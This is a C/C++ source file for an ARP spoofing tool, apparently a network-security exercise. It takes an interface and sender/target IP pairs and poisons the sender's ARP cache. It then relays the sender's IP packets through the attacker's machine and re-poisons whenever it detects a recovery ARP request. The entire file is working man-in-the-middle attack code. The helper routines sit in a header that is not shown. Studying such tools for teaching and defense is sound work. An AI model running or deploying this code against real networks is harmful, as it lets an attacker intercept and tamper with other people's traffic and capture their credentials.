#include "arp.h"

uint8_t my_mac[6], my_ip[4],
	mac_ff[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
	mac_00[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
map<uint32_t, uint8_t*> ip2mac;
pcap_t *handle;

void usage() {
	printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) 
{
	if (argc < 4 || argc % 2) 
	{
		usage();
		return -1;
	}

	vector<session> sess;
	const uint8_t sess_cnt = argc / 2 - 1;
	
	u_char send_pkt[50];
	const u_char *recv_pkt;
	struct pcap_pkthdr *header;
  	char *interface = argv[1];
  	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) 
	{
    		fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
    		return -1;
  	}  	

	// get my address
	get_my_mac(my_mac);
	get_my_ip(my_ip, interface); 

	// make session & get mac address
	for(int i = 0; i < sess_cnt; i++) 
	{
		session s;
		s.send_ip = inet_addr(argv[i * 2 + 2]);
		if(ip2mac.find(s.send_ip) == ip2mac.end()) 
		{
			ip2mac[s.send_ip] = (uint8_t*)malloc(ADDR_LEN_MAC);
			get_mac_addr((uint8_t*)&s.send_ip);
		}

		s.tar_ip = inet_addr(argv[i * 2 + 3]);
		if(ip2mac.find(s.tar_ip) == ip2mac.end()) 
		{
			ip2mac[s.tar_ip] = (uint8_t*)malloc(ADDR_LEN_MAC);
			get_mac_addr((uint8_t*)&s.tar_ip);
		}
		sess.push_back(s);
	}
	
	// first infection
	for(int i = 0; i < sess_cnt; i++) 
		arp_infection(sess[i]);

	// ip packet relay & recovery detection
	while (true) 
	{
		int res = pcap_next_ex(handle, &header, &recv_pkt);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		ether_header *ethhdr = (ether_header*)recv_pkt;
		
		for(int i = 0; i < sess_cnt; i++)
		{
			if(!memcmp(ip2mac[sess[i].send_ip], ethhdr->src_mac, ADDR_LEN_MAC))
			{
				// packet relay
				if(ethhdr->ether_type == htons(ETHERTYPE_IP))
				{
					if(memcmp(my_ip, recv_pkt + DST_IP_POS, 4))
						pkt_relay(recv_pkt, header->caplen, sess[i]);
				}
				// recovery detection
				else if(ethhdr->ether_type == htons(ETHERTYPE_ARP))
				{
					arp_header *arphdr = (arp_header*)(recv_pkt + sizeof(ether_header));
					if((arphdr->op == htons(ARP_REQUEST)) && 
					   (!memcmp(arphdr->tar_ip, (uint8_t*)&sess[i].tar_ip, ADDR_LEN_IP)))
							arp_infection(sess[i]);
				}
						
				break;
			}
		}
	}
}
